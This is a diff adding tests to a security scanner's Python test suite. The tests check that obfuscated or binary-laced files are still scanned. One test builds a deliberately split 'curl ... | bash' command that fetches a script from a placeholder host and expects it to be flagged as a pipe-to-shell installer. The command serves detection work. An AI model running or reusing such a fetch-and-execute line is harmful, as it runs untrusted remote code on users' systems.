@@ -204,6 +204,18 @@ class TestNonUtf8IsStillScanned(CoverageCase):
         self.assertEqual(self.payload_file("blob.xyz", b"\x00\xff"), [(1, "coverage.binary")])
         self.assertEqual(self.payload_file("late.xyz", b"x" * 9000 + b"\x00\xff"), [(1, "coverage.binary")])
 
+    def test_nul_inside_valid_utf8_does_not_split_a_payload(self) -> None:
+        # Round 4: shells drop NUL bytes, so the scan does too.
+        installer = "c\0u" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
+        result = self.only("install.sh", ("echo hi\n" + installer + "\n").encode())
+        self.assertEqual([(f.line, f.rule) for f in result.findings], [(2, "rce.pipe_installer")])
+
+    def test_shebang_opaque_file_and_trailing_dot_name_are_scanned(self) -> None:
+        self.assertEqual(self.payload_file("run.dat", b"#!/bin/sh\xff"),
+                         [(1, "coverage.unreadable"), (2, "inject.ignore_prev")])
+        self.assertEqual(self.payload_file("payload.", b"\x00\xff"),
+                         [(1, "coverage.unreadable"), (2, "inject.ignore_prev")])
+
     def test_extensionless_dotfiles_and_bom_shebang_are_scanned_despite_nul(self) -> None:
         for name, head in (("Dockerfile", b"\x00\xff"), (".bashrc", b"\x00\xff"),
                            ("pre-commit.hook", b"\xef\xbb\xbf#!/bin/sh\x00\xff")):
